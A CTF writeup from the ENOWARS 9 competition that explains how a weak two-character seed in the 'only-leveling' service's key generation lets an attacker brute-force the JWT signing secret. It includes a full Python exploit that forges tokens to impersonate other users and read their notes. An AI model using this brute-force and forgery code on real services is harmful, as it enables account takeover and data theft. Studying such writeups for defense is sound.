---
title: "only-leveling - ENOWARS 9"
category: "web"
subcategory: "jwt"
type: "writeup"
tags: ["web", "jwt", "only-leveling", "enowars", "enowars-9", "ctf-writeup"]
summary: "Onlyleveling is a Python-based service, which consists of a backend, a frontend, and a seed generator."
source:
  name: "CTFtime writeup #40349"
  url: "https://ctftime.org/writeup/40349"
original_source: "https://saarsec.rocks/2025/07/21/ENOWARS-onlyleveling.html"
ctf:
  name: "ENOWARS 9"
  challenge: "only-leveling"
---

## Metadata

- **CTF:** ENOWARS 9
- **Task:** only-leveling
- **Author team:** saarsec
- **CTFtime:** <https://ctftime.org/writeup/40349>
- **Original writeup:** <https://saarsec.rocks/2025/07/21/ENOWARS-onlyleveling.html>

---
Onlyleveling is a Python-based service, which consists of a backend, a frontend, and a seed generator. The frontend was only responsible for the UI, so we did not bother further. However, looking at the backend, we could see `[generate_secret.sh](http://generate_secret.sh)`, which was called in `[start.sh](http://start.sh)`. This contains the following code:

```  
SALT=$(date +"%H%M%S")  
SEED=$(printf "%s\n" "$SALT" | nc "$HOST" "$PORT" | tr -d '\r\n')  
SECRET=$(echo -n "$SEED" | head -c2 | sha256sum | awk '{print $1}')

echo "SECRET_KEY=$(echo "$SECRET" | cut -c1-16)" > .env  
```

What becomes readily obvious is that when starting the service, this is supposed to connect to the seed service (which probably caused another bug, but I didn't have time to investigate) and use the response for the secret key generation. However, as shown in line 3 of the script, the `head -c2` only ever takes the first two chars, which are then passed to sha256sum.

Looking into the code, it became obvious that this `SECRET_KEY` was used in `[auth.py](http://auth.py)` to sign the JWT used for authentication. Hence, it was obvious what to do: create an account with a target team, get a valid JWT. Bruteforce through all potential `SECRET_KEYS` (the seed service appeared to only return digits even) to see if I could validate the JWT locally. If so, I guessed the correct SECRET_KEY. Subsequently, use that SECRET_KEY to issue a JWT for whatever user I wanted to impersonate. Find the Python code below:

```  
def brute_force(token):  
for a, b in itertools.product(string.digits, repeat=2):  
secret = hashlib.sha256((a + b).encode()).hexdigest()[:16]  
try:  
jwt.decode(token, secret, algorithms=["HS256"])  
return secret  
except:  
pass  
return None

def exploit(target):  
flag_ids = get_flag_id("only-leveling", target)  
all_users = set()  
for key, values in flag_ids.items():  
for value in values.values():  
all_users.update(value)

sess = requests.Session()  
username = randomstring(16)  
password = randomstring(16)  
[sess.post](http://sess.post)(f"http://{target}:2626/register",  
json={"username": username,  
"password": password})

resp = [sess.post](http://sess.post)(f"http://{target}:2626/token",  
data={"username": username,  
"password": password}).json()  
token = resp["access_token"]

secret = brute_force(token)

if not secret:  
return

decoded_token = jwt.decode(token, secret, algorithms=["HS256"])

sess = requests.Session()  
sess.headers["Connection"] = "close"

for username in all_users:  
decoded_token["sub"] = username  
new_token = jwt.encode(decoded_token, secret, algorithm="HS256")  
sess.headers["Authorization"] = f"Bearer {new_token}"  
data = sess.get(f"http://{target}:2626/users/me").json()  
if "items" in data:  
for item in data["items"]:  
print(execute_brainfuck(item["note"]))

```
